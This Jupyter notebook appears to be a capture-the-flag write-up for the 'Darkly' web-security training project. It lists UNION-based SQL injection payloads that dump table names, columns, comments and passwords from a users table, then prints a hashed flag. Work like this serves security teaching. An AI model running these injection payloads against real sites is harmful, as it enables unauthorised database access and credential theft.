{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ccea90a7-8592-456f-8cf5-0b233f7f1ad3",
   "metadata": {},
   "source": [
    "# <center>Darkly</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0a106b0-de48-4470-a783-39db2022e7a5",
   "metadata": {},
   "source": [
    "***\n",
    "# <center>1 - SQL Injection in search member page</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4741dd6f-c529-4b8c-8adb-da561bfc1615",
   "metadata": {},
   "source": [
    "| ID | Query                                                                                                                      |\n",
    "|----|----------------------------------------------------------------------------------------------------------------------------|\n",
    "| 1  | ```1 union all select 1, 2```                                                                                              |\n",
    "| 2  | ```1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()```           |\n",
    "| 3  | ```1 union all select 1,group_concat(column_name) from Information_schema.columns where table_schema=database()```         |\n",
    "| 4  | ```1 union all select 1,group_concat(Commentaire) from users```                                                            |\n",
    "| 5  | ```1 union all select 1,group_concat(countersign) from users```                                                     |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20e0b52f-25ab-4922-9efd-d73063bde5ca",
   "metadata": {},
   "source": [
    "## Objectif\n",
    "Trouver la chaîne de caractères qui, lorsqu'elle est hachée avec MD5, produit le hash spécifié \"5ff9d0165b4f92b14994e5c685cdce28\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b1637691-818d-47d2-8397-d61b9b5bae41",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[92mFlag 1 : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 \u001b[0m\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "\n",
    "print(\"\\033[92mFlag 1 :\", hashlib.sha256(b\"fortytwo\").hexdigest(),\"\\033[0m\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8cc13c6b-9b4e-47f1-bcdb-310f80f0b94d",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cabfdc5a-a937-4dfb-97ae-f32c82e45520",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82d04fd7-f88e-47d3-8c3b-ddc655ae994e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "639162c2-24fb-41b2-a7d2-32720c36d239",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7296d877-c2da-4185-b2fc-1da655d5ebd5",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4cf7257-63a7-4a32-a977-42ae20f95713",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1073c9a-8a26-4ebd-be0a-1e0e7aad6c25",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c3302af-6e6f-491d-96df-46d44d4ab98c",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e1cee4c-96b9-4a4c-bdd2-bcd0f6b0e600",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5a60248b-db19-4d33-bc8f-70a132bff848",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c7699e2-d684-4ca2-be89-1efb5b56db31",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ee2bb14-1f9e-4702-a857-43aed5b12168",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
